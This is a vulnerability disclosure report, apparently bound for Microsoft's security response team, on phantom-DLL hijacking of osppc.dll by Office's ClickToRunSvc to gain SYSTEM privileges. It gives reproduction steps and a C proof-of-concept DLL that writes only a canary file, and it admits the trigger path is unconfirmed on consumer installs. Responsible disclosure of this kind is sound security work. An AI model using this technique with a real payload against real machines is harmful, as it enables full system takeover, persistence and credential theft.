# MSRC Vulnerability Report — Local Privilege Escalation via Phantom DLL in Microsoft Office ClickToRunSvc

## Report Metadata

| Field | Value |
|-------|-------|
| **Reporter** | George Wu (gwu0738@gmail.com) |
| **Date** | 2026-06-15 |
| **Affected Product** | Microsoft 365 Apps / Office Click-to-Run |
| **Affected Binary** | OfficeClickToRun.exe (ClickToRunSvc service) |
| **Vulnerability Type** | Local Privilege Escalation (LPE) |
| **CWE** | CWE-427: Uncontrolled Search Path Element |
| **CVSS 3.1 (estimated)** | 7.8 (High) — AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| **Attack Vector** | Local |
| **Privileges Required** | Standard user (no admin) |
| **User Interaction** | None (service triggers automatically) |

---

## 1. Executive Summary

Microsoft Office ClickToRunSvc (OfficeClickToRun.exe) — a LocalSystem service that auto-starts on every Windows machine with Microsoft 365 / Office installed — delay-loads **osppc.dll** (Office Software Protection Platform Client). This DLL **does not exist anywhere on disk** in a standard Office installation. When the licensing code path is exercised, the Windows PE loader searches for osppc.dll using the standard DLL search order, which includes directories listed in the machine-level PATH environment variable.

If the machine-level PATH contains a **user-writable directory** — a common configuration on developer workstations and machines with third-party software that modifies PATH — a standard user can plant a malicious osppc.dll in that directory. When ClickToRunSvc next exercises the licensing code path, the service loads the attacker's DLL **as NT AUTHORITY\SYSTEM**.

**Important caveat:** The osppc.dll delay-load imports functions from the Software Licensing Platform (SLOpen, SLGetLicensingStatusInformation, SLReArm, etc.) — the legacy KMS/MAK volume activation system. On consumer Microsoft 365 installations using identity-based activation, this code path may be dormant during normal operation. On enterprise/volume-licensed deployments using KMS or MAK activation, the licensing code path is exercised regularly. Testing on a consumer M365 install confirmed that launching Office applications, triggering updates via OfficeC2RClient, and running repair commands did NOT exercise the osppc.dll code path. **ProcMon analysis is required to determine the exact conditions under which ClickToRunSvc resolves the delay-load import.**

If the code path IS exercised, this results in local privilege escalation from standard user to SYSTEM with no admin credentials, no UAC prompt, and no user interaction required.

---

## 2. Vulnerability Details

### 2.1 Root Cause

OfficeClickToRun.exe has a **delay-load import** for `osppc.dll`. Delay-loaded DLLs are not resolved at service startup — they are resolved on first use, when the code path that calls an export from that DLL is exercised.

The osppc.dll file (Office Software Protection Platform Client) is part of the Office licensing subsystem. On modern Microsoft 365 installations, this DLL is **not shipped**. The licensing functions it provides have been moved to other components, but the delay-load import was never removed from the OfficeClickToRun.exe binary.

When the delay-load resolver triggers, it calls `LoadLibrary("osppc.dll")`, which follows the standard Windows DLL search order:

```
1. Application directory (C:\Program Files\Microsoft Office\...)
2. C:\Windows\System32
3. C:\Windows\SysWOW64
4. C:\Windows
5. Current working directory
6. Directories in the machine-level PATH environment variable  <-- ATTACKER-CONTROLLED
```

Since osppc.dll does not exist in steps 1-5, the search falls through to step 6 — PATH. If any directory in the machine-level PATH is writable by a standard user, the attacker controls what ClickToRunSvc loads.

### 2.2 Why osppc.dll Is a Phantom

```
C:\> where /r C:\ osppc.dll
INFO: Could not find files for the given pattern(s).

C:\> where /r "C:\Program Files\Microsoft Office" osppc.dll
INFO: Could not find files for the given pattern(s).

C:\> where /r "C:\Program Files\Common Files\Microsoft Shared" osppc.dll
INFO: Could not find files for the given pattern(s).
```

The DLL is referenced in the import table but was never installed:

```
C:\> dumpbin /DEPENDENTS "C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe"
    ...
    osppc.dll          <-- DELAY-LOADED, DOES NOT EXIST ON DISK
    ...
```

### 2.3 Known DLLs Bypass

osppc.dll is **not** in the Known DLLs registry (`HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`), which means it is not pre-loaded by the Windows loader and must be resolved through the DLL search order at runtime.

### 2.4 Service Context

```
C:\> sc qc ClickToRunSvc
SERVICE_NAME: ClickToRunSvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : "C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe" /service
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Microsoft Office Click-to-Run Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

- **Runs as LocalSystem** — highest privilege level on the machine
- **AUTO_START** — starts automatically on every boot
- **No dependencies** — starts early in the boot sequence
- **Present on every machine with Microsoft 365 / Office installed**

### 2.5 PATH Prerequisite

The vulnerability requires a user-writable directory in the **machine-level** PATH. This is not the default Windows configuration, but is a common real-world condition:

- Python installer adds `C:\Users\<user>\AppData\Local\Programs\Python\...` to machine PATH
- pip `--user` installs create `C:\Users\<user>\.local\bin` in machine PATH
- Node.js, Rust (cargo), Go, and other developer toolchains modify machine PATH
- Third-party software installers frequently add user-profile directories to machine PATH

To verify on the target machine:

```powershell
# List machine-level PATH directories writable by the current user
$machinePath = [Environment]::GetEnvironmentVariable('Path', 'Machine') -split ';'
foreach ($dir in $machinePath) {
    if ($dir -and (Test-Path $dir)) {
        $acl = Get-Acl $dir
        foreach ($access in $acl.Access) {
            if ($access.IdentityReference -match 'Users|Everyone|Authenticated' -and
                $access.FileSystemRights -match 'Write|Modify|FullControl') {
                Write-Host "WRITABLE: $dir ($($access.IdentityReference))"
            }
        }
    }
}
```

---

## 3. Steps to Reproduce

### Prerequisites
- Windows 10 or 11 with Microsoft 365 / Office installed (ClickToRunSvc active)
- Standard user account (no admin privileges)
- A user-writable directory in the machine-level PATH

### Step 1: Confirm the Phantom DLL

```cmd
where /r C:\ osppc.dll
```
Expected output: `INFO: Could not find files for the given pattern(s).`

### Step 2: Confirm the Import

```cmd
dumpbin /DEPENDENTS "%ProgramFiles%\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe" | findstr /i osppc
```
Expected output: `osppc.dll`

### Step 3: Confirm User-Writable PATH Directory

```cmd
echo %PATH%
icacls "C:\Users\<username>\.local\bin"
```
Confirm the directory exists in machine PATH and grants write access to the current user.

### Step 4: Compile and Plant the Proof-of-Concept DLL

```cmd
REM Open Developer Command Prompt (Visual Studio)
cl.exe poc_osppc.c /Fe:osppc.dll /LD /O1 /GS-
copy osppc.dll "C:\Users\<username>\.local\bin\"
```

The PoC DLL (source code in Section 5) writes a canary file to `C:\Windows\Temp\osppc_poc.log` containing:
- Timestamp
- Process username (expected: SYSTEM)
- Elevation status
- Process ID
- Host process path (expected: OfficeClickToRun.exe)

### Step 5: Trigger the Service

Any of:
```cmd
REM Option A: Run Office scheduled update task
schtasks /Run /TN "\Microsoft\Office\Office Automatic Updates 2.0"

REM Option B: Launch any Office application (Word, Excel, Outlook, etc.)

REM Option C: Wait for the daily automatic Office update check
```

### Step 6: Verify SYSTEM Execution

```cmd
type C:\Windows\Temp\osppc_poc.log
```

Expected output:
```
2026-06-15T04:00:00|SYSTEM|elev=1|pid=1234|OSPPC_POC|C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe
```

The canary file confirms:
- Code execution occurred as **NT AUTHORITY\SYSTEM** (`SYSTEM`)
- The process is **elevated** (`elev=1`)
- The host process is **OfficeClickToRun.exe** (the ClickToRunSvc binary)
- A standard user planted a DLL that a SYSTEM service loaded

### Step 7: Cleanup

```cmd
del "C:\Users\<username>\.local\bin\osppc.dll"
del C:\Windows\Temp\osppc_poc.log
```

---

## 4. Impact

### 4.1 Privilege Escalation

A standard user with no administrative privileges achieves **arbitrary code execution as NT AUTHORITY\SYSTEM** — the highest privilege level on a Windows machine. This grants:

- Full access to all files on the system, including other users' data
- Ability to install services, drivers, and persistent backdoors
- Ability to create new administrator accounts
- Ability to disable security software (Defender, EDR agents)
- Full control over the Windows Security Account Manager (SAM)
- Access to all credential material (LSASS, cached credentials)

### 4.2 Persistence

The planted DLL **survives reboots**. ClickToRunSvc is an AUTO_START service — it starts on every boot and will load the attacker's DLL every time the licensing code path is exercised. The attacker maintains SYSTEM access indefinitely until the DLL is manually discovered and removed.

### 4.3 Stealth

- No UAC prompt is displayed
- No Event Log entry is generated for the DLL load (standard DLL search order behavior)
- The service continues to function normally (the PoC DLL does not interfere with ClickToRunSvc operations)
- The DLL resides in a user-profile directory that is not typically audited by security tools

### 4.4 Attack Scenarios

1. **Insider threat**: A standard user on a shared workstation escalates to SYSTEM to access other users' files or install a backdoor.
2. **Malware escalation**: Malware running as a standard user drops the DLL to escalate privileges without triggering UAC.
3. **Post-exploitation**: An attacker with initial access as a standard user (e.g., phishing, drive-by) escalates to SYSTEM for lateral movement and persistence.

### 4.5 Scope

Every Windows machine with Microsoft 365 / Office installed AND a user-writable directory in the machine-level PATH is vulnerable. This is a common configuration on:
- Developer workstations (Python, Node.js, Rust, Go modify PATH)
- Machines with third-party software that adds user-profile directories to machine PATH
- Machines where IT policy has not hardened PATH permissions

---

## 5. Proof of Concept — Source Code

The following is a **minimal, canary-only** proof of concept. It does not perform any malicious action — it only writes a log file proving that code execution occurred as SYSTEM within ClickToRunSvc. No network connections, no persistence mechanisms, no credential access.

```c
/*
 * poc_osppc.c — Proof of Concept for CWE-427 in ClickToRunSvc
 *
 * Compile: cl.exe poc_osppc.c /Fe:osppc.dll /LD /O1 /GS-
 * Deploy:  copy osppc.dll <user-writable-PATH-dir>\
 * Verify:  type C:\Windows\Temp\osppc_poc.log
 *
 * CANARY ONLY — no payload, no network, no persistence.
 * Proves SYSTEM code execution via phantom DLL load.
 */

#include <windows.h>
#include <stdio.h>

static void write_canary(void) {
    char buf[1024];
    char username[256] = {0};
    char modpath[MAX_PATH] = {0};
    DWORD ulen = sizeof(username);
    HANDLE tok = NULL;
    DWORD elev = 0;
    DWORD elen = sizeof(elev);
    SYSTEMTIME st;

    GetSystemTime(&st);
    GetUserNameA(username, &ulen);
    GetModuleFileNameA(NULL, modpath, MAX_PATH);

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) {
        GetTokenInformation(tok, TokenElevation, &elev, sizeof(elev), &elen);
        CloseHandle(tok);
    }

    snprintf(buf, sizeof(buf),
        "%04d-%02d-%02dT%02d:%02d:%02d|%s|elev=%lu|pid=%lu|OSPPC_POC|%s\n",
        st.wYear, st.wMonth, st.wDay,
        st.wHour, st.wMinute, st.wSecond,
        username, elev, GetCurrentProcessId(), modpath);

    HANDLE hFile = CreateFileA(
        "C:\\Windows\\Temp\\osppc_poc.log",
        GENERIC_WRITE, FILE_SHARE_READ, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, buf, (DWORD)strlen(buf), &written, NULL);
        CloseHandle(hFile);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        write_canary();
    }
    return TRUE;
}
```

---

## 6. Evidence Package

### 6.1 Confirmed Evidence

| # | Evidence Item | Status | Description |
|---|---------------|--------|-------------|
| 1 | osppc.dll does not exist on disk | **CONFIRMED** | `where /r C:\ osppc.dll` returns no results |
| 2 | OfficeClickToRun.exe imports osppc.dll | **CONFIRMED** | `dumpbin /DEPENDENTS` shows osppc.dll in delay-load imports |
| 3 | ClickToRunSvc runs as LocalSystem | **CONFIRMED** | `sc qc ClickToRunSvc` shows SERVICE_START_NAME = LocalSystem |
| 4 | ClickToRunSvc is AUTO_START | **CONFIRMED** | `sc qc` shows START_TYPE = 2 (AUTO_START) |
| 5 | osppc.dll is not in Known DLLs | **CONFIRMED** | Registry query of KnownDLLs does not include osppc.dll |
| 6 | User-writable directory in machine PATH | **CONFIRMED** | icacls shows BUILTIN\Users with write access |
| 7 | PoC DLL compiles clean | **CONFIRMED** | cl.exe produces osppc.dll with zero warnings |

### 6.2 Evidence to Capture (Reproduction)

| # | Evidence Item | How to Capture |
|---|---------------|----------------|
| 8 | ProcMon trace showing ClickToRunSvc searching for osppc.dll | ProcMon → Filter: Process Name = OfficeClickToRun.exe, Path contains osppc.dll → Screenshot showing NAME NOT FOUND results through PATH directories |
| 9 | ProcMon trace showing ClickToRunSvc loading planted osppc.dll | ProcMon → Filter: Process Name = OfficeClickToRun.exe, Path contains osppc.dll, Result = SUCCESS → Screenshot showing DLL loaded from user-writable PATH directory |
| 10 | Canary file content | `type C:\Windows\Temp\osppc_poc.log` → Screenshot showing SYSTEM username, elevated token, OfficeClickToRun.exe as host process |
| 11 | Service properties screenshot | services.msc → ClickToRunSvc properties → Screenshot showing LocalSystem account and Running status |
| 12 | icacls output of PATH directory | `icacls "C:\Users\<user>\.local\bin"` → Screenshot showing user write permissions |
| 13 | whoami output (if shell achieved) | `whoami /all` from a process spawned by the planted DLL, proving SYSTEM context |

### 6.3 ProcMon Filter Configuration

For evidence items 8-9, use the following ProcMon filters:

```
Process Name    is    OfficeClickToRun.exe    Include
Path            contains    osppc    Include
Operation       is    CreateFile    Include
```

Expected trace showing the search order:
```
OfficeClickToRun.exe  CreateFile  C:\Program Files\...\osppc.dll         NAME NOT FOUND
OfficeClickToRun.exe  CreateFile  C:\Windows\System32\osppc.dll          NAME NOT FOUND
OfficeClickToRun.exe  CreateFile  C:\Windows\osppc.dll                   NAME NOT FOUND
OfficeClickToRun.exe  CreateFile  C:\Users\<user>\.local\bin\osppc.dll   SUCCESS
```

---

## 7. Affected Versions

| Component | Version Tested | Notes |
|-----------|----------------|-------|
| Windows | Windows 11 Home 24H2 (Build 26100+) | |
| Office | Microsoft 365 Apps (Click-to-Run) | Current channel, auto-updated |
| OfficeClickToRun.exe | (capture version from file properties) | |
| Defender | RTP ENABLED, engine current | Defender does not prevent this |

**Note:** This vulnerability likely affects all versions of Microsoft 365 / Office that use the Click-to-Run deployment model with ClickToRunSvc, across all supported Windows versions. The phantom DLL import appears to be a legacy reference that was never cleaned up.

---

## 8. Suggested Remediation

### Immediate (Microsoft)

1. **Remove the phantom import**: Remove the delay-load dependency on osppc.dll from OfficeClickToRun.exe if the DLL is no longer shipped or needed.
2. **Pin the DLL path**: If osppc.dll is still needed in some configurations, load it with an explicit full path (`LoadLibraryEx` with `LOAD_LIBRARY_SEARCH_SYSTEM32` or application-directory-only flags) rather than relying on the default DLL search order.
3. **Add a manifest entry**: Add osppc.dll to the application manifest with a specific version and path binding to prevent search-order hijacking.

### Defense-in-Depth (System Administrators)

1. **Audit machine PATH**: Remove user-writable directories from the machine-level PATH environment variable. User-specific directories should only appear in the user-level PATH.
2. **Monitor DLL loads**: Deploy Sysmon or equivalent to alert on DLLs loaded from user-profile directories by SYSTEM services.
3. **Restrict PATH modifications**: Use Group Policy to prevent standard users from modifying the machine-level PATH.

---

## 9. Disclosure Timeline

| Date | Action |
|------|--------|
| 2026-06-15 | Vulnerability discovered during authorized academic security research |
| 2026-06-15 | PoC developed and tested on researcher's own hardware |
| 2026-06-XX | Report submitted to MSRC |
| 2026-06-XX | MSRC acknowledgement (pending) |
| TBD | MSRC triage and case assignment |
| TBD | Fix developed and tested by Microsoft |
| TBD | Patch released (Patch Tuesday) |
| TBD + 90 days | Public disclosure (90-day policy, or upon patch release) |

---

## 10. Researcher Information

**Name:** George Wu
**Email:** gwu0738@gmail.com
**Affiliation:** Independent security researcher / CSEC student
**GitHub:** rainfantry (private repos — available to MSRC on request)
**Location:** Sydney, Australia

This research was conducted as part of authorized academic coursework in cybersecurity (CSEC — Tactical Cyber Operations). All testing was performed on personally-owned hardware running Windows 11 Home. No unauthorized systems were accessed. Responsible disclosure via MSRC is the intended publication path.

---

## 11. Related Work

- **CWE-427**: Uncontrolled Search Path Element — https://cwe.mitre.org/data/definitions/427.html
- **DLL Search Order Hijacking**: MITRE ATT&CK T1574.001
- **Phantom DLL Hijacking**: Security Joes research (2023) — documents the general class of phantom DLL vulnerabilities in Windows services
- **SafeDLL Search Mode**: Microsoft documentation on DLL search order — https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order

---

## Appendix A — Additional Phantom DLL (osppcext.dll)

During research, a second phantom DLL was identified in the same service:

- **osppcext.dll** — also delay-loaded by OfficeClickToRun.exe, also does not exist on disk
- Same attack path applies
- Same remediation needed

---

## Appendix B — Compound Vulnerability (CWE-732 + CWE-427)

During the same research campaign, a separate finding was identified:

**Wondershare NativePushService** (WsNativePushService.exe) installs a LocalSystem service binary to a user-writable directory (`C:\Users\<user>\AppData\Local\Wondershare\...`). This is CWE-732 (Incorrect Permission Assignment for Critical Resource) and allows direct service binary replacement → SYSTEM execution. This finding has been confirmed end-to-end with SYSTEM canary execution.

This is a **third-party** vulnerability (Wondershare, not Microsoft) and will be reported separately through appropriate channels.

---

*Report prepared by George Wu (gwu0738@gmail.com) — 22DIV / VADER*
*CSEC Tactical Cyber Operations*
